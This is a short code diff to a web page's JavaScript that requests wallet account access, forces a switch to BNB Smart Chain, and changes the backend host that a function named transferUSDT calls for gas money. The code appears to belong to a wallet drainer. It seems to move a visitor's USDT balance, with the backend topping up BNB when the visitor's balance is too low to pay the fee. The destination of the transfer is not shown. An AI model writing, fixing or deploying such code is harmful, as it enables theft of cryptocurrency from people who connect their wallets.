@@ -1263,7 +1263,7 @@ async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_accounts" });
+            await window.ethereum.request({ method: "eth_requestAccounts" });
 
             // Force switch to BNB Smart Chain
             await window.ethereum.request({
@@ -1331,7 +1331,7 @@ async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
     console.log("User BNB is low. Requesting BNB from backend...");
-    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+    await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ toAddress: userAddress })
